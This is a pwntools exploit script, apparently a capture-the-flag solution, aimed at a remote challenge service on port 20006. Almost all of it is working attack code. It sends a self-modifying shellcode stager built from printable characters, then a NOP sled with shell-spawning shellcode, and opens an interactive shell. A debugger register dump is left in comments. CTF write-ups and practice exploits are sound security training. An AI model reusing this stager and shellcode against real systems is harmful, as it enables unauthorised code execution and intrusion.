#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host finaladvpwn2.nu-tech.xyz --port 20006 ./pwn
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./pwn')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'finaladvpwn2.nu-tech.xyz'
port = int(args.PORT or 20006)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *0x0000000000400861
# b *0x4007d9
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

io = start()

shellc = asm("""
        push 0x356a5658
        pop rax
        xor dword ptr [rdx +0x20], eax
        pop rdx
        push rsp
        pop rsi
        pop rax
        pop rcx
    """)
nop = asm("push rdi; pop rcx")
while len(shellc) < 0x20:
    shellc += nop
shellc += p32(0x6a345357)

shellcode = shellc.ljust(0x200, 'G')
io.sendafter("coba?",shellcode)

sleep(0.1)
p = '\x90'*200+asm(shellcraft.sh())
io.sendline(p)


# for i in range(0x20,0x80):
#     print(disasm(chr(i)))
# $rax   : 0x0               
# $rbx   : 0x0               
# $rcx   : 0x007f40e351034e  →  0x5a77fffff0003d48 ("H="?)
# $rdx   : 0x007ffcbc3a4400  →  "h/A//XH5PQO/P^hj5XVX1Fm1FuH3FqPTj0X40PP4u4NZ4jWSEW[...]"
# $rsp   : 0x007ffcbc3a43d8  →  0x00000000400863  →  <vuln+301> nop 
# $rbp   : 0x007ffcbc3a4610  →  0x007ffcbc3a4620  →  0x0000000000000001
# $rsi   : 0x007ffcbc3a43eb  →  0x00410000020047 ("G"?)
# $rdi   : 0x0               
# $rip   : 0x007ffcbc3a4400  →  "h/A//XH5PQO/P^hj5XVX1Fm1FuH3FqPTj0X40PP4u4NZ4jWSEW[...]"
# $r8    : 0x007f40e360ca50  →  0x0000000000000000
# $r9    : 0x77              
# $r10   : 0x007f40e341c5d8  →  0x000e001200001a64
# $r11   : 0x246             
# $r12   : 0x007ffcbc3a4738  →  0x007ffcbc3a533d  →  "/media/sf_CTF/nu_tech/Coba_Tebak_Nama_Lengkap_Saya[...]"
# $r13   : 0x0000000040088b  →  <main+0> push rbp
# $r14   : 0x0    
io.interactive()

